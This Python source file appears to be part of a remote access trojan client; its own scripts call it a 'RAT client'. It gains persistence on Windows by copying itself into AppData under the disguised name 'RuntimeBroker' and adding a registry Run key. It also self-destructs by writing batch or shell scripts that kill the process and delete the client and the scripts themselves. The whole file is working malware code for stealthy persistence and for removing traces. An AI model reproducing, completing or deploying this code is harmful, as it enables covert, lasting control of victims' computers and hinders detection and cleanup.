
import os
import platform
import shutil
import subprocess
import sys

PERSISTENCE_NAME = "RuntimeBroker"

def _get_script_path() -> str:
    """Returns the path of the currently running script."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.realpath(__file__)

def _manage_persistence_windows(enable=True) -> str:
    """Manages persistence on Windows using the Registry."""
    try:
        exe_path = sys.executable
        dest_folder = os.path.join(os.environ["APPDATA"], PERSISTENCE_NAME)
        dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        if enable:
            os.makedirs(dest_folder, exist_ok=True)
            if os.path.realpath(exe_path).lower() != os.path.realpath(dest_path).lower():
                shutil.copyfile(exe_path, dest_path)
            cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            return f"Persistence enabled. Client will start on next login from '{dest_path}'."
        else:
            cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
            subprocess.run(cmd, shell=True, check=False, capture_output=True, text=True)
            if os.path.exists(dest_path):
                try:
                    subprocess.run(f"taskkill /f /im {os.path.basename(dest_path)}", shell=True, check=False, capture_output=True)
                    os.remove(dest_path)
                    os.rmdir(dest_folder)
                except OSError:
                    pass # Ignore errors if the file is already gone
            return "Persistence successfully removed."
    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
        return f"Error managing Windows persistence: {e}"
    except Exception as e:
        return f"An unexpected error occurred during Windows persistence: {e}"

def manage_persistence(enable=True) -> str:
    """Manages client persistence across different operating systems."""
    system = platform.system()
    if system == "Windows":
        return _manage_persistence_windows(enable)
    # In a real-world scenario, you would add implementations for macOS and Linux here.
    elif system in ["Darwin", "Linux"]:
        return f"{system} persistence management is not implemented in this version."
    else:
        return f"Persistence is not supported on this OS: {system}."

def uninstall_client() -> str:
    """Removes persistence and schedules the client for self-deletion."""
    try:
        persistence_msg = manage_persistence(enable=False)
        client_path = _get_script_path()
        
        if platform.system() == "Windows":
            batch_content = f"""
@echo off
echo "Uninstalling RAT client..."
timeout /t 3 /nobreak > NUL
taskkill /f /im \"{os.path.basename(client_path)}\" > NUL
del \"{client_path}\" 
del \"%~f0\"
"""
            batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
            with open(batch_path, "w") as f:
                f.write(batch_content)
            subprocess.Popen(f'\"{batch_path}\" ', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
        else:  # Linux and macOS
            script_content = f"""
#!/bin/sh
echo "Uninstalling RAT client..."
sleep 3
kill -9 {os.getpid()}
rm -f \"{client_path}\" 
rm -- \"$0\"
"""
            script_path = os.path.join(os.path.expanduser("~"), ".uninstall.sh")
            with open(script_path, "w") as f:
                f.write(script_content)
            os.chmod(script_path, 0o755)
            subprocess.Popen([script_path], shell=True)

        return f"{persistence_msg}\nUninstallation process started. The client will self-destruct shortly."

    except Exception as e:
        return f"Error during uninstallation: {e}"
